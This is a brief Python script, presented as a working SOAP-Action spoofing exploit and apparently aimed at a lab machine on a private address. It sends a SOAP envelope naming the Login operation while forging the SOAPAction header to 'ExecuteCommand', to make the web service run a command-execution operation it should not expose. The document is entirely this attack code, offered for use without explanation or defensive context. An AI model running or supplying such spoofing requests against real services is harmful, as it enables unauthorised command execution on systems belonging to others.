# This is an example of a working SOAP-ACTION spoofing python script

import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><Login xmlns="http://tempuri.org/"></Login></soap:Body></soap:Envelope>'

print(requests.post("http://10.129.25.120:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
